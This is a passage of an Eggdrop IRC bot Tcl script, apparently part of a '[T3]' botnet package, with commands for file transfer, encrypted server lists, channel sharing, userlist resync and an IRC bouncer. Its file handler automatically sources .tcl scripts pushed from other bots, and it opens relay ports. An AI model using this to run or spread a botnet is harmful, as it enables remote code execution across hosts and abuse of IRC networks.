   if {[transfer_status]} { putdcc $idx "*** No pending file transfers at this time." }
}
bind dcc n filestatus file_status

proc move_file { handle nick path } {
   global mainchan filesends
   set file $path
   if {[string match "*/*" $path]} { set file [string range $path [expr 1+[string last "/" $path]] end] }
   putlog "\[\002FILE RECEIVED\002\] Successfully received '$file' from \002$handle\002."
   if {![matchattr $handle boT] && ![matchattr $handle npT]} {
      if {[matchattr $handle bo]} { return }
      announce "\[\002ALERT\002\] \002$nick\002 sent me '$file', but does not have the required flags to move the file."
      announce " - Leaving file in incoming directory"
   } elseif {![info exists filesends($nick:$file)] && (![validchan $mainchan] || ![botisop $mainchan] || ![isop $nick $mainchan])} {
      announce "\[\002ALERT\002\] \002$nick\002 sent me '$file', but one of us is not opped on main channel ($mainchan)."
      announce " - File not moved, deleting '$path'"
      if {[catch {exec rm -f $path} error] != 0} {
         announce "\[\002ERROR\002\] Could not delete '$path' from incoming directory:  $error"
      }
   } elseif {[string match *.tcl $path]} {
      if {[catch {exec mv $path "scripts/$file"} error] != 0} {
         announce "\[\002ERROR\002\] Unable to move '$file' to scripts directory:  $error"
         announce " - Deleting '$path'"
         catch {exec rm -f $path}
      } else {
         announce "\[\002FILE MOVED\002\] Successfully moved '$file' to tcl scripts directory."
         if {[matchattr $handle b]} { catch {putbot $handle "moved $file"} }
         catch {exec chmod 700 "scripts/$file"}
         setutimer 1 "catch {source scripts/[str2tcl $file]}"
      }
   } elseif {[catch {exec mv $path $file} error] != 0} {
      announce "\[\002ERROR\002\] Unable to move '$file' to eggdrop directory:  $error"
      announce " - Deleting '$path'"
      catch {exec rm -f $path}
   } else {
      announce "\[\002FILE MOVED\002\] Successfully moved '$file' to eggdrop directory."
      if {[matchattr $handle b]} { catch {putbot $handle "moved $file"} }
      catch {exec chmod 700 $file}
   }
   catch {unset filesends($nick:$file)}
}
bind rcvd - * move_file


proc transfer_help { handle idx args } {
   putcmdlog "#$handle# transferhelp"
   putdcc $idx " "
   putdcc $idx "\026\002\[T3\] File Transfer Services - Help Menu\002\026"
   putdcc $idx "   \002send\002 <key> <bot|user> <file1> \[file2\] ...  Send file(s) to specified bot/user"
   putdcc $idx "   \002get\002 <key> <bot> <file1> \[file2\] ...        Receive file(s) from specified bot"
   putdcc $idx " "
   putdcc $idx "   \002msend\002 <key> <file1> \[file2\] ...            Send file(s) to all bots"
   putdcc $idx "      - Sending multiple files is supported, but it is not advisable."
   putdcc $idx "        Send a maximum of 2 simultaneous files if there are more than 10 bots."
   putdcc $idx " "
   putdcc $idx "   \002mget\002 <key> <file1> \[file2\] ...             Receive file(s) from all bots"
   putdcc $idx "      - Use wildcards when using this function.  Example: .mget *.conf"
   putdcc $idx "      - Even though this function supports multiple files, it is not recommended."
   putdcc $idx "        Too many bots initiating a dcc send may be construed as a flood."
   putdcc $idx " "
   putdcc $idx "   \002rehashbot\002 <*|bots>                   Rehash remote bots"
   putdcc $idx " "
   putdcc $idx "   \002filestatus\002                           Displays pending or incomplete transfers"
   putdcc $idx " "
}
bind dcc n transferhelp transfer_help


######################################################################################
##  Automated Server List Update

proc dcc_update_servers { handle idx args } {
   global ircservers
   putcmdlog "#$handle# updateServers"
   catch {unset ircservers}
   putserv "LINKS"
}
bind dcc n updateservers dcc_update_servers
bind dcc n updatelinks dcc_update_servers

proc preferred_servers { handle idx args } {
   global prefservers
   set servers [lindex $args 0]
   putcmdlog "#$handle# addserver $servers"
   if {$servers == ""} {
      putdcc $idx "\002Usage:\002 .addserver <server1> \[server2\] ..."
      if {[info exists prefservers] && $prefservers != {}} {
         putdcc $idx "\n\002Currently preferred servers:\002  $prefservers"
      }
   } else {
      foreach 1server [split $servers] {
         if {![info exists prefservers] || [lsearch -exact $prefservers $1server] == -1} {
            lappend prefservers $1server
         }
      }
      save_settings
      putdcc $idx "*** Preferred IRC servers are now:  $prefservers"
   }
}
bind dcc m addserver preferred_servers
bind dcc m prefserver preferred_servers
bind dcc m preferredserver preferred_servers

proc delpreferred_servers { handle idx args } {
   global prefservers
   set servers [lindex $args 0]
   putcmdlog "#$handle# delserver $servers"
   if {$servers == ""} {
      putdcc $idx "\002Usage:\002 .delserver <server1> \[server2\] ..."
      if {[info exists prefservers] && $prefservers != {}} {
         putdcc $idx "\n\002Currently preferred servers:\002  $prefservers"
      }
      return
   }
   if {[info exists prefservers] && $prefservers != {}} {
      foreach 1server [split $servers] {
         if {[set s [lsearch -exact $prefservers $1server]] != -1} { set prefservers [lreplace $prefservers $s $s] }
      }
   }
   save_settings
   putdcc $idx "*** Preferred IRC servers are now:  $prefservers"
}
bind dcc m delserver delpreferred_servers

proc only_preferred { handle idx args } {
   global onlypref prefservers
   set args [lindex $args 0]
   set switch [sindex $args 0]
   putcmdlog "#$handle# onlypreferred $args"
   if {$switch == "no"} {
      catch {unset onlypref}
      save_settings
      putdcc $idx "*** Server file will be periodically updated with current server listing."
   } elseif {$switch == "yes"} {
      if {![info exists prefservers] || [llength $prefservers] < 1} {
         putdcc $idx "*** No preferred IRC servers have been set; use .addserver <server>" ; return
      }
      set onlypref ""
      save_settings
      putdcc $idx "*** Only preferred IRC servers will be used:  $prefservers"
   } else { putdcc $idx "\002Usage:\002 .onlypreferred <yes|no>" }
}
bind dcc n onlypreferred only_preferred

proc update_servers { from keyword args } {
   global ircservers
   set args [lindex $args 0]
   if {[string match \\\[* [sindex $args 4]]} {
      regsub -all {\[} $args "" server
      regsub -all {\]} $server "" server
      lappend ircservers [sindex $server 4]
   } else {
      regsub -all {\*} $args "irc" server
      lappend ircservers [sindex $server 1]
   }
}
bind raw - 364 update_servers

proc end_serverlist { from keyword args } {
   global nick proxybot servers servfile ircservers prefservers onlypref realservers tclKey
   if {![info exists ircservers] || ([llength $ircservers] < 1)} { set ircservers {} }
   if {[catch {set serverfile [open ".$nick.servers" w 0600]} open_error] != 0} {
      putlog "\[\002ERROR\002\] Could not open file to save current IRC servers:  $open_error"
      catch {unset ircservers}
      return
   }
   if {[info exists prefservers] && [llength $prefservers] > 0} {
      foreach 1prefserver $prefservers { lappend tempservers $1prefserver }
   }
   if {![info exists onlypref]} {
      foreach 1server $ircservers { lappend tempservers $1server }
   }
   unset ircservers
   set fcounter 0
   if {![info exists proxybot]} {
      if {[catch {
            puts $serverfile [encrypt $tclKey "set servers {}" $fcounter] ; incr fcounter
            foreach 1server $tempservers { puts $serverfile [encrypt $tclKey "lappend servers $1server" $fcounter] ; incr fcounter }
         } write_error] != 0} {
         putlog "\[\002ERROR\002\] Could not write servers to file:  $write_error"
      }
      set servers $tempservers
   } else {
      if {[catch {
            puts $serverfile [encrypt $tclKey "set realservers {}" $fcounter] ; incr fcounter
            foreach 1server $tempservers { puts $serverfile [encrypt $tclKey "lappend realservers $1server" $fcounter] ; incr fcounter }
          } write_error] != 0} {
         putlog "\[\002ERROR\002\] Could not write servers to file:  $write_error"
      }
      set realservers $tempservers
   }
   catch {close $serverfile}
   if {[catch {exec mv ".$nick.servers" $servfile} error] != 0} {
      putlog "\[\002ERROR\002\] Could not move server listing from temp file:  $error"
   } else { cryptsource $tclKey $servfile }
   putlog "\[\002SERVERS\002\] Updated server listing"
}
bind raw - 365 end_serverlist


######################################################################################
##  Message of the Day

proc set_motd { handle idx args } {
   global nick curmotd
   set message [lindex $args 0]
   putcmdlog "#$handle# motd $message"
   if {$message == ""} {
      putdcc $idx "\002Usage:\002 .motd \[-erase\] \[message\]"
      if {[info exists curmotd] && $curmotd != ""} {
         putdcc $idx " "
         putdcc $idx "\002Current MOTD:\002  $curmotd"
      }
      return
   }
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {[string tolower $message] == "-erase"} {
      set curmotd ""
   } else { set curmotd "$message  -- set by $handle on [ctime [unixtime]]" }
   if {$curmotd != ""} {
      putdcc $idx "*** New MOTD set."
   } else { putdcc $idx "*** Removed MOTD." }
   save_settings
   putallbots "motd $handle $curmotd"
}
bind dcc m motd set_motd

proc get_motd { bot command args } {
   global curmotd
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set curmotd [srange $args 1 end]
   save_settings
   if {$curmotd != ""} {
      putlog "\[\002MOTD\002\] New MOTD set by $handle@$bot."
      putlog "   $curmotd"
      putlog " "
   } else { putlog "\[\002MOTD\002\] MOTD removed by $handle@$bot." }
}
bind bot - motd get_motd


######################################################################################
##  Set Main Channel

proc main_channel { handle idx args } {
   global nick mainchan manOp
   set args [lindex $args 0]
   if {[valididx $idx]} {
      if {![matchattr $nick boT]} { noflag $idx ; return }
      putcmdlog "#$handle# mainchan $args"
      if {$args == ""} { putdcc $idx "\002Usage:\002 .mainchan <channel>" ; return }
      putdcc $idx "*** Main channel is now \002[sindex $args 0]\002."
      putallbots "mainchan $handle [sindex $args 0]"
   } else {
      if {$args == ""} { return }
      putlog "\[\002MAINCHAN\002\] Main channel is now \002[sindex $args 0]\002 - set by $handle"
   }
   if {[valididx $idx]} { putdcc $idx "*** You now have \00210\002 minutes to manually op on main channel ($mainchan)." }
   set mainchan [sindex $args 0]
   addchan $mainchan
   set manOp([string tolower *:$mainchan]) 600
   setutimer 600 "catch {unset manOp([string tolower [str2tcl *:$mainchan]])}"
   save_settings
   channel set $mainchan +secret
   channel set $mainchan chanmode "+stn"
}
bind dcc n mainchannel main_channel
bind dcc n mainchan main_channel

proc net_mainchan { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   main_channel [sindex $args 0]@$bot - [sindex $args 1]
}
bind bot - mainchan net_mainchan


######################################################################################
##  Netsplit Detection

proc netsplit { from keyword args } {
   global serverlist split splitdetect gotsplit
   set raw [string range [lindex $args 0] 1 end]
   if {[regexp -nocase \[^\ a-z0-9.*-\] $raw]} { return }
   if {![info exists splitdetect] || [info exists gotsplit] || ![info exists serverlist] || [llength $raw] != 2} { return 0 }
   set server1 [sindex $raw 0] ; set server2 [sindex $raw 1]
   set unick [lindex [split $from !] 0]
   if {[lsearch -exact $serverlist $server1] != -1 && [lsearch -exact $serverlist $server2] != -1} {
      set split "$unick@$server1@$server2@[ctime [unixtime]]"
      set gotsplit ""
      setutimer 15 "catch {unset gotsplit}"
      putserv "WHOWAS $unick"
   }
}
bind raw - QUIT netsplit

proc checking_split { from keyword args } {
   global splitdetect botsplit
   if {![info exists splitdetect]} { return 0 }
   if {[srange [lindex $args 0] 1 end] == ""} { set botsplit "" } else { catch {unset botsplit} }
}
bind raw - 312 checking_split

proc got_splitserver { from keyword args } {
   global splitdetect botsplit split server proxybot realserver
   if {![info exists splitdetect] || ![info exists split]} { return 0 }
   if {![info exists botsplit]} {
      set splitinfo [split $split @]
      announce "\002NETSPLIT DETECTED\002:  \002[lindex $splitinfo 2]\002"
      announce "   [lindex $splitinfo 0] split away on [lindex $splitinfo 3]."
   } else {
      if {![info exists proxybot]} {
         set split $server
      } elseif {[info exists realserver]} {
         set split $realserver
      } else { unset botsplit split ; return 0 }
      announce "\002POSSIBLE NETSPLIT\002:  \002[lindex [split $split :] 0]\002"
      announce "   My current server split on [ctime [unixtime]]."
      unset botsplit
   }
   unset split
}
bind raw - 369 got_splitserver

proc temp_servers { from keyword args } {
   global tempservlist
   lappend tempservlist [sindex [lindex $args 0] 1]
}
bind raw - 364 temp_servers

proc serverlist { from keyword args } {
   global serverlist tempservlist
   if {![info exists tempservlist]} { return 0 }
   set serverlist $tempservlist
   unset tempservlist
}
bind raw - 365 serverlist

proc split_detect { handle idx args } {
   global splitdetect
   set args [lindex $args 0]
   set switch [sindex $args 0]
   putcmdlog "#$handle# splitdetect $args"
   if {$switch == "off"} {
      catch {unset splitdetect}
      save_settings
      putdcc $idx "*** Netsplit detection deactivated."
   } elseif {$switch == "on"} {
      set splitdetect ""
      save_settings
      putdcc $idx "*** Netsplit detection activated."
   } else { putdcc $idx "\002Usage:\002 .splitdetect <on|off>" }
}
bind dcc m splitdetect split_detect
bind dcc m detectsplit split_detect
bind dcc m netsplit split_detect


######################################################################################
##  Bot/Shell Uptimes

proc uptimes { handle idx args } {
   global nick uptime
   set bots [lindex $args 0]
   putcmdlog "#$handle# uptimes $bots"
   if {$bots == ""} { putdcc $idx "\002Usage:\002 .uptimes <*|bots>" }
   if {[catch {set up [exec uptime]}] == 0} {
      set shelluptime [string trimright [lrange $up [expr [lsearch $up *up*]+1] [expr [lsearch $up *user*]-2]] ,]
   } else { set shelluptime  "   (unknown)  " }
   set botuptime [expr [unixtime] - $uptime]
   set days [expr $botuptime / 86400]
   set hours [expr ($botuptime % 86400) / 3600]
   set minutes [expr (($botuptime % 86400) % 3600) / 60]
   if {[string length $hours] == 1} { set hours "0$hours" }
   if {[string length $minutes] == 1} { set minutes "0$minutes" }
   set spacing "          "
   set daynum "[string range $spacing 0 [expr 2 - [string length $days]]]$days"
   if {$days == 1} {
      set botuptime " $daynum day, $hours:$minutes"
   } else { set botuptime "$daynum days, $hours:$minutes" }
   if {$bots == "*" || $bots == ""} {
      putdcc $idx " "
      putdcc $idx "  \037  BOT UPTIME  \037    \037 SHELL UPTIME \037"
      putdcc $idx " $botuptime     $shelluptime      \002$nick\002"
      if {$bots == "*"} { putallbots "uptimes $idx" }
      return
   }
   putdcc $idx " "
   putdcc $idx "  \037  BOT UPTIME  \037    \037 SHELL UPTIME \037"
   foreach 1bot [split $bots] { catch {putbot $1bot "uptimes $idx"} }
}
bind dcc n uptimes uptimes

proc send_uptimes { bot command idx } {
   global nick uptime
   if {![matchattr $bot bo]} { return }
   if {[catch {set up [exec uptime]}] == 0} {
      set shelluptime [string trimright [lrange $up [expr [lsearch $up *up*]+1] [expr [lsearch $up *user*]-2]] ,]
   } else { set shelluptime  "   (unknown)  " }
   set botuptime [expr [unixtime] - $uptime]
   set days [expr $botuptime / 86400]
   set hours [expr ($botuptime % 86400) / 3600]
   set minutes [expr (($botuptime % 86400) % 3600) / 60]
   if {[string length $hours] == 1} { set hours "0$hours" }
   if {[string length $minutes] == 1} { set minutes "0$minutes" }
   set spacing "          "
   set daynum "[string range $spacing 0 [expr 2 - [string length $days]]]$days"
   if {$days == 1} {
      set botuptime " $daynum day, $hours:$minutes"
   } else { set botuptime "$daynum days, $hours:$minutes" }
   regsub -all " " " $botuptime     $shelluptime     \002$nick\002" "#" uptimeoutput
   catch {putbot $bot "myuptimes $idx $uptimeoutput"}
}
bind bot - uptimes send_uptimes

proc received_uptimes { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set idx [sindex $args 0]
   if {![valididx $idx]} { return }
   regsub -all "#" [sindex $args 1] " " uptimeoutput
   putdcc $idx "$uptimeoutput"
}
bind bot - myuptimes received_uptimes


######################################################################################
##  Monitor queues

proc monitor_queues {} {
   global mtot htot max-queue-msg
   if {[info exists mtot] && $mtot > [expr ${max-queue-msg} * 3/4]} { dumpserv }
   if {[info exists htot] && $htot > [expr ${max-queue-msg} * 3/4]} { dumphelp }
   setutimer 30 monitor_queues
}

proc flush_queue { idx arg } {
   global nick mtot htot
   set handle [idx2hand $idx]
   set command [string range [sindex $arg 0] 1 end]
   set bots [srange $arg 1 end]
   if {![strcmp $command dumpserv] && ![strcmp $command dumphelp]} {
      putdcc $idx "What?  You need '.help'" ; return
   }
   putcmdlog "#$handle# [string range $arg 1 end]"
   if {$bots == ""} {
      putdcc $idx "\002Usage:\002 .$command \[*|bots\]"
      putdcc $idx " "
      $command
   } elseif {![matchattr $nick boT]} {
      noflag $idx
   } elseif {$bots == "*"} {
      $command
      putallbots "$command $handle"
   } else {
      foreach 1bot [split $bots] { catch {putbot $1bot "$command $handle"} }
   }
   return
}
bind filt n ".dumpserv*" flush_queue
bind filt n ".dumphelp*" flush_queue

proc net_flushqueue { bot command args } {
   if {![matchattr $bot boT]} { return }
   $command
   putlog "\[\002[string toupper $command]\002\] Queue emptied by [lindex $args 0]@$bot."
}
bind bot - dumpserv net_flushqueue
bind bot - dumphelp net_flushqueue


######################################################################################
##  Channel-info sharing (info exchange)

proc share_info { bot via } {
   global nick mainchan lbthresh hbthresh minbots 
   global chstatus chmodes badhosts autokick curmotd counters
   if {[matchattr $bot bo]} {
      if {![info exists counters([string tolower $nick])]} {
         set counters([string tolower $nick]) [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] 0] 
      }
      putbot $bot "shareinfo opcounts $counters([string tolower $nick])"
   }
   if {$via != $nick || ![matchattr $nick H]} { return }
   if {[info exists mainchan]} { putbot $bot "shareinfo mainchan $mainchan" }
   foreach 1chan [channels] {
      putbot $bot "shareinfo chnset $1chan [lrange [channel info $1chan] 7 end]"
      putbot $bot "shareinfo chmode $1chan [lindex [channel info $1chan] 0]"
      if {[info exists chstatus([string tolower $1chan])]} { putbot $bot "shareinfo status $1chan $chstatus([string tolower $1chan])" }
      if {[info exists chmodes($1chan)]} { putbot $bot "shareinfo shmode $1chan $chmodes($1chan)" }
      if {[info exists lbthresh($1chan)]} { putbot $bot "shareinfo lothr $1chan $lbthresh($1chan)" }
      if {[info exists hbthresh($1chan)]} { putbot $bot "shareinfo hithr $1chan $hbthresh($1chan)" }
   }
   if {[info exists autokick]} { putbot $bot "shareinfo autokick $autokick" }
   if {[info exists badhosts]} { putbot $bot "shareinfo badhosts $badhosts" }
   if {[info exists minbots]} { putbot $bot "shareinfo minlink $minbots" }
   if {[info exists curmotd]} { putbot $bot "shareinfo curmotd $curmotd" }
   putbot $bot "shareinfo end"
}
bind link - * share_info

proc receive_info { bot command args } {
   global mainchan lbthresh hbthresh minbots
   global chstatus chmodes badhosts autokick curmotd init counters
   set args [lindex $args 0]
   set info [sindex $args 0]
   if {$info == "opcounts"} {
      if {![matchattr $bot bo]} { return }
      set counters([string tolower $bot]) [sindex $args 1]
      setutimer 2 save_settings
      return
   }
   if {![matchattr $bot boHh] && ![matchattr $bot boHa]} { return }
   switch -- $info {
      mainchan {
         set mainchan [sindex $args 1]
         if {![validchan $mainchan]} { main_channel $bot - $mainchan }
      }
      chnset {
         set channel [sindex $args 1]
         if {![validchan $channel]} {
            if {[info exists init]} { addchan $channel } else { return }         
         }
         foreach 1setting [split [srange $args 2 end]] { channel set $channel $1setting }   
      }
      chmode {
         if {[matchattr $bot L]} { return }
         set channel [sindex $args 1] ; set setting [sindex $args 2]
         if {![validchan $channel]} {
            if {[info exists init]} { addchan $channel } else { return }         
         }
         if {[validchan $channel] && !([string match "*-*" $setting] && ![string match "*-l*" $setting] && ![string match "*-k*" $setting])} {
            channel set $channel chanmode "$setting"
         }
      }
      lothr { set lbthresh([sindex $args 1]) [sindex $args 2] }
      hithr { set hbthresh([sindex $args 1]) [sindex $args 2] }
      status { set chstatus([string tolower [sindex $args 1]]) [sindex $args 2] }
      shmode { set chmodes([string tolower [sindex $args 1]]) [sindex $args 2] }
      minlink { set minbots [sindex $args 1] }
      curmotd { if {[srange $args 1 end] != ""} { set curmotd [srange $args 1 end] } }
      autokick { set autokick [string tolower [srange $args 1 end]] }
      badhosts { set badhosts [srange $args 1 end] }
      end {
         catch {unset init}
         save_settings
         putlog "*** Channel information from hub successfully stored."
      }
   }
}
bind bot - shareinfo receive_info


######################################################################################
##  Resynch Userlist

proc resynch_users { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# resynchusers $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} { putdcc $idx "\002Usage:\002 .resynchusers <*|bots>" ; return }
   if {$args == "*"} { set bots [bots] } else { set bots [split $args] }
   foreach 1bot $bots {
      catch {putbot $1bot "resynchusers #start#"}
      foreach 1user [string tolower [userlist]] { catch {putbot $1bot "resynchusers $1user"} }
      catch {putbot $1bot "resynchusers #end#"}
   }
}
bind dcc n resynchusers resynch_users

proc net_resynchusers { bot command user } {
   global userlist counters dontOp
   if {![matchattr $bot boT]} { return }
   if {$user == "#end#"} {
      if {![array exists userlist] || [array names userlist #start#] == ""} { return }
      foreach 1user [string tolower [userlist]] {
         if {![info exists userlist($1user)]} {
            catch {unset counters([string tolower $1user])}
            catch {unset dontOp([string tolower $1user])}
            deluser $1user
         }
      }
      unset userlist
      putlog "\[\002RESYNCHUSERS\002\] Userlist resynched by \002$bot\002."
      save
   } else { set userlist($user) 1 }
}
bind bot - resynchusers net_resynchusers


######################################################################################
##  Eggdrop BNC TCL v5.00
##  Author - [T3] (based on version by Imaginos)

proc bnc { idx } {
   global clientargs clientnick clientidx serveridx
   catch {unset clientidx($idx)} ; catch {unset clientargs($idx)} ; catch {unset clientnick($idx)}
   foreach sock [array names serveridx] {
      if {$serveridx($sock) == $idx} { catch {killdcc $sock} ; unset serveridx($sock) }
   }
   control $idx control_bnc
}

proc control_bnc { idx text } {
   global userid my-ip my-hostname clientport clientargs clientnick clientidx serveridx
   if {[strcmp [sindex $text 0] pass]} { set clientargs($idx) [split [sindex $text 1] :] }
   if {[strcmp [sindex $text 0] nick]} { set clientnick($idx) "NICK [sindex $text 1]" }
   if {[strcmp [sindex $text 0] user]} { 
      if {![info exists clientargs($idx)]} {
         foreach sock [array names serveridx] {
            if {$serveridx($sock) == $idx} { catch {killdcc $sock} ; unset serveridx($sock) }
         }
         catch {killdcc $idx} ; catch {unset clientidx($idx)} ; catch {unset clientnick($idx)}
         return
      }
      set clientuser($idx) "USER [srange $text 1 end]"
      set bport [lindex $clientargs($idx) 0] ; set pass [lindex $clientargs($idx) 1]
      set server [lindex $clientargs($idx) 2] ; set port [lindex $clientargs($idx) 3] ; set vhost [lindex $clientargs($idx) 4]
      if {![info exists clientnick($idx)]} { set clientnick($idx) "NICK CORE" }
      if {![info exists clientport($bport)]} { putdcc $idx ":BNC!$userid@${my-hostname} NOTICE (ERROR) :Invalid BNC port. Try again." ; return }
      if {$pass == "" || [encryptpass $pass] != $clientport($bport)} {
         putdcc $idx ":BNC!$userid@${my-hostname} NOTICE (ERROR) :*** Incorrect BNC password. Try again." ; return
      }
      if {$server == ""} { set server "irc.efnet.net" }
      if {$port == ""} { set port "6666" }
      putdcc $idx ":BNC!$userid@${my-hostname} NOTICE (STATUS) :*** Connecting to $server on port $port ..."
      if {$vhost != ""} {
         set original-ip ${my-ip}
         if {[string match *.* $vhost]} {
            if {[isip $vhost]} {
               set my-ip $vhost
            } elseif {[catch {gethost $vhost} error] == 0} {
               set my-ip [gethost $vhost]
            } else { putdcc $idx ":BNC!$userid@${my-hostname} NOTICE (ERROR) :*** ERROR setting vhost ($vhost): $error" }
         } else { putdcc $idx ":BNC!$userid@${my-hostname} NOTICE (ERROR) :*** ERROR setting vhost ($vhost): Invalid hostname" }
      }
      if {[catch {set socket [connect $server $port]} error] != 0} {
         putdcc $idx ":BNC!$userid@${my-hostname} NOTICE (ERROR) :*** ERROR establishing connection: $error"
      } else {
         set clientidx($idx) $socket
         set serveridx($socket) $idx
         putdcc $socket $clientnick($idx)
         putdcc $socket $clientuser($idx)
         control $socket server_side
      }
      if {[info exists original-ip]} { set my-ip ${original-ip} }
      return
   }
   if {[info exists clientidx($idx)] && [valididx $clientidx($idx)]} { putdcc $clientidx($idx) $text }
   if {[strcmp [sindex $text 0] quit]} {
      foreach sock [array names serveridx] {
         if {$serveridx($sock) == $idx} { catch {killdcc $sock} ; unset serveridx($sock) }
      }
      catch {killdcc $idx} ; catch {unset clientidx($idx)} ; catch {unset clientargs($idx)} ; catch {unset clientnick($idx)}
   }
}

proc server_side { idx text } {
   global clientargs clientnick clientidx serveridx
   if {[info exists serveridx($idx)] && [valididx $serveridx($idx)]} { putdcc $serveridx($idx) $text }
   if {[strcmp [sindex $text 0] error]} {
      foreach sock [array names clientidx] {
         if {$clientidx($sock) != $idx} { continue }
         catch {killdcc $sock}
         unset clientidx($sock) ; catch {unset clientargs($sock)} ; catch {unset clientnick($sock)}
      }
      catch {killdcc $idx}
   }
}

proc start_bnc { handle idx args } {
   global nick my-hostname clientport botport userport
   set args [lindex $args 0]
   set port [sindex $args 0] ; set pass [sindex $args 1]
   putcmdlog "#$handle# bnc $port"
   if {$port < 1024 || $port > 65535 || $pass == ""} {
      putdcc $idx "\002Usage:\002 .bnc <port> <pass>  (valid range: 1024-65535)"
      if {[array exists clientport] && [array names clientport] != ""} { putdcc $idx "\n*** Currently active BNC ports:  [array names clientport]" }
      return
   }
   if {$port == $botport || $port == $userport || [info exists clientport($port)]} {
      putdcc $idx "*** That port is already in use.  Please try another." ; return
   }
   catch {listen $port script bnc}
   set clientport($port) [encryptpass $pass]
   if {[strcmp [sindex $args 2] -perm]} { set type "Permanent BNC" ; save_settings } else { set type "BNC" }
   putdcc $idx "*** $type started on port $port."
   putdcc $idx "To connect:  /server ${my-hostname} $port $port:$pass:<server>:<port>\[:vhost\]"
}
bind dcc n bnc start_bnc

proc stop_bnc { handle idx args } {
   global clientport
   set args [lindex $args 0]
   set port [sindex $args 0] ; set pass [sindex $args 1]
   putcmdlog "#$handle# bncstop $port"
   if {$pass == "" || ![isnum $port]} {
      putdcc $idx "\002Usage:\002 .bncstop <port> <pass>"
      if {[array exists clientport] && [array names clientport] != ""} {
         putdcc $idx "\n*** Currently active BNC ports:  [array names clientport]"
      } else { putdcc $idx "\n*** There are no currently active BNC ports." }
      return
   }
   if {![info exists clientport($port)]} { putdcc $idx "*** There is no active BNC on that port." ; return }
   if {[encryptpass $pass] != $clientport($port)} { putdcc $idx "Incorrect BNC password" ; return }
   catch {listen $port off}
   unset clientport($port)
   save_settings
   putdcc $idx "*** BNC on port $port halted."
}
bind dcc n bncstop stop_bnc
bind dcc n bnckill stop_bnc
bind dcc n stopbnc stop_bnc
bind dcc n killbnc stop_bnc


######################################################################################
##  Scan for common hosts

proc host_compare { handle idx args } {
   global botnick
   set args [lindex $args 0]
   set channel [sindex $args 0]
   putcmdlog "#$handle# findhosts $channel"
   if {$channel == ""} { putdcc $idx "\002Usage:\002 .findhosts <channel>" ; return }
   if {![validchan $channel] || ![onchan $botnick $channel]} { putdcc $idx "*** Failed to initiate host scan:  not on $channel" ; return }
   putdcc $idx "*** Scanning for matching hosts, please wait ..."
   putdcc $idx " "
   set matches 0
   foreach 1op [chanoplist $channel] {
      set 1ophost [getchanhost $1op $channel]
      if {[catch {set IP [gethost [lindex [split $1ophost @] 1]]}] != 0} { continue }
      set next 0
      foreach 1user [userlist] {
         if {$next} { break }
         foreach 1host [gethosts $1user] {
            if {[isip $1host] && [string match *!*@[string range $IP 0 [string last . $IP]]* $1host]} {
               set hostsFound($matches) "   [expr $matches+1].  \002$1op\002 ($IP)  -->  $1user ($1host)"
               incr matches
               set next 1
               break
            }
         }
      }
   }
   if {![valididx $idx]} { return }
   if {!$matches} {
      putdcc $idx "No matches."
   } else {
      putdcc $idx "OP (IP) --> Matching User (Userhost)"
      putdcc $idx "\002$matches\002 matches found:"
      for {set j 0} {$j < $matches} {incr j} { putdcc $idx "$hostsFound($j)" }
   }
}
bind dcc n findhosts host_compare
bind dcc n scanhosts host_compare


######################################################################################
##  Remote Notes

proc remote_notes { idx arg } {
   if {![strcmp [sindex $arg 0] .notes]} { return $arg }
   set switch [sindex $arg 1]
   if {![string match *@* $switch]} {
      if {$switch != ""} { return $arg }
      putdcc $idx "\002Usage:\002 .notes <read|erase>\[@bot|*\] \[index|all\]"
      return
   }
   set handle [idx2hand $idx]
   putcmdlog "#$handle# [string range $arg 1 end]"
   set command [lindex [split $switch @] 0] ; set bot [lindex [split $switch @] 1]
   if {$bot == "*"} {
      putdcc $idx "*** Sending notes command to all remote bots ..."
      putdcc $idx " "
      putallbots "netnotes $handle $idx $command [sindex $arg 2] *"
      return
   }
   if {![validuser $bot] || [lsearch [string tolower [bots]] $bot] == -1} {
      putdcc $idx "*** Remote bot ($bot) is not linked." ; return
   }
   catch {putbot $bot "netnotes $handle $idx $command [sindex $arg 2]"}
   return
}
bind filt - ".notes*" remote_notes

proc net_notes { bot command args } {
   global nick
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set idx [sindex $args 1] ; set command [sindex $args 2] ; set index [sindex $args 3]
   set numnotes [notes $handle]
   if {![validuser $handle] || ($numnotes == 0 && [sindex $args 4] == "*")} { return }
   if {[strcmp $command read]} {
      if {$numnotes == 0} { catch {putbot $bot "show $idx ($nick) You have no messages waiting."} ; return }
      set indices {}
      if {![isnum $index]} {
         for {set i 0} {$i < $numnotes} {incr i} { lappend indices [expr $i+1] }
      } else { lappend indices $index }
      foreach index $indices {
         set note [lindex [notes $handle $index] 0]
         if {[isnum $note]} {
            catch {putbot $bot "show $idx ($nick) No such message with specified index ($index)"} ; return
         }
         set from [lindex $note 0]
         set time [strftime %b\ %d\ %H:%M [lindex $note 1]]
         set mesg [lindex $note 2]
         catch {putbot $bot "show $idx $index. $from@$nick ($time): $mesg"}
      }
   } elseif {[strcmp $command erase]} {
      if {![isnum $index]} {
         if {[catch {delnotes $handle} error] == 0} {
            catch {putbot $bot "show $idx ($nick) Erased all notes"}
         } else { catch {putbot $bot "show $idx ($nick) Failed to erase all notes: $error"} }
      } else {
         if {[catch {delnotes $handle $index} error] == 0} {
            catch {putbot $bot "show $idx ($nick) Erased the specified note ($index)"}
         } else { catch {putbot $bot "show $idx ($nick) Failed to erase the specified note ($index): $error"} }
      }
   }
}
bind bot - netnotes net_notes


######################################################################################
##  Bot Proxy Support
##  Author - Vengador Obscuro (with mods by [T3])

bind raw - NOTICE proxy_notice

proc proxy_initserver { } {
  global botnick proxybot reconnect identdconn
  catch {unset identdconn}
  if { [info exists reconnect] && $reconnect == "reconnect" } {
    putserv "NICK $botnick"
    foreach chan [channels] {
      resetchan $chan
      putserv "MODE $chan +b"
      putserv "TOPIC $chan"
    }
  }
  putserv "MODE $botnick +iw-s"
  getlinks
}

proc proxy_notice { from keyword args } {
  global server servers proxyauth proxypass crap reconnect identdconn
  if {![info exists proxypass($server)]} {
     set proxypass($server) "none"
